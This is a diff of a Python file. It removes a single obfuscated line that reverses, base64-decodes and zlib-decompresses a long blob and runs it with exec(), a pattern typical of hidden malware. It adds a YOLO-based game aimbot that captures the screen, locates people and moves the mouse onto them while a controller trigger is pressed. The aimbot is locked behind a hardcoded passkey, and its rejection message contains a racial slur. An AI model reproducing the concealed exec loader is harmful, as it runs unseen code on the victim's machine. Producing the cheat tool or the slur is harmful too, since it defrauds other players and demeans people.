@@ -1,1 +1,122 @@
-_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'=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'))
+from ultralytics import YOLO
+import bettercam
+import numpy as np
+import ctypes
+import torch
+import pygame
+import os
+import time
+
+os.system("cls")
+
+try:
+ DEVICE = "cuda"  
+ if DEVICE == "cuda":
+    torch.backends.cudnn.benchmark = True
+
+ mouse_event = ctypes.windll.user32.mouse_event
+
+ FULL_CENTER_X = 960
+ FULL_CENTER_Y = 540
+
+ CAPTURE_SIZE = 224
+
+ REL_CENTER_X = CAPTURE_SIZE 
+ REL_CENTER_Y = CAPTURE_SIZE 
+
+ REGION = (
+    FULL_CENTER_X - REL_CENTER_X,  
+    FULL_CENTER_Y - REL_CENTER_Y, 
+    FULL_CENTER_X + REL_CENTER_X,  
+    FULL_CENTER_Y + REL_CENTER_Y,  
+)
+
+ CAMERA = bettercam.create(
+    output_idx=0,
+    output_color="BGR",
+    region=REGION
+)
+
+
+ class PersonDetector:
+    def __init__(self, model_path):
+        self.model = YOLO(model_path)
+        self.model.to(DEVICE) 
+
+    @torch.inference_mode()
+    def detect_person(self, img):
+        img = np.ascontiguousarray(img)
+
+        results = self.model(
+            img,
+            classes=[0],           
+            conf=0.5,             
+            imgsz=CAPTURE_SIZE,    
+            device=DEVICE,           
+            verbose=False,
+            half=True
+        )
+
+        if not results or not len(results[0].boxes):
+            return []
+
+        return results[0].boxes.xyxy 
+
+ def grab():
+    frame = CAMERA.grab()
+    if frame is None:
+        return np.array([])
+    return frame  
+
+ def main():
+    detector = PersonDetector(r"C:\\Program Files\\siv\\best.pt")
+
+    VERTICAL_AIM_FACTOR = 0.25  
+
+    while True:
+        img = grab()
+        if img.size == 0:
+            continue
+
+        boxes = detector.detect_person(img)
+        if len(boxes) == 0:
+            continue
+
+        if torch.is_tensor(boxes):
+            boxes = boxes.cpu().numpy()
+            
+        x1, y1, x2, y2 = boxes[0]
+
+        cx = (x1 + x2) / 2
+        h = y2 - y1
+        cy = y1 + h * VERTICAL_AIM_FACTOR
+
+        dx = int(cx - REL_CENTER_X)
+        dy = int(cy - REL_CENTER_Y)
+        pygame.init()
+        axis = pygame.joystick.Joystick(0)
+        pygame.joystick.init()
+        axis.init()
+        pygame.event.pump()
+        if axis.get_axis(4) > 0.0:
+         mouse_event(0x0001, dx, dy)
+
+except Exception as file_err:
+    print("Error Please Reinstall from the install.exe or Plug in controller")
+
+
+def banner():
+ print("""
+     \033[1;35m                   
+ _____ _ _         
+|   __|_|_|_ _ ___ 
+|__   | | | | | .'|
+|_____|_|_|\_/|__,| v9 """)
+ p = input("\n\033[0mEnter \033[1;36mPasskey\033[0m: \033[1;35m")
+ if p == "7816":
+     print("\033[0m[\033[1;34mINFO\033[0m] Loaded")
+     main()
+ else:
+    print("no nigga")
+    time.sleep(2)
+banner()
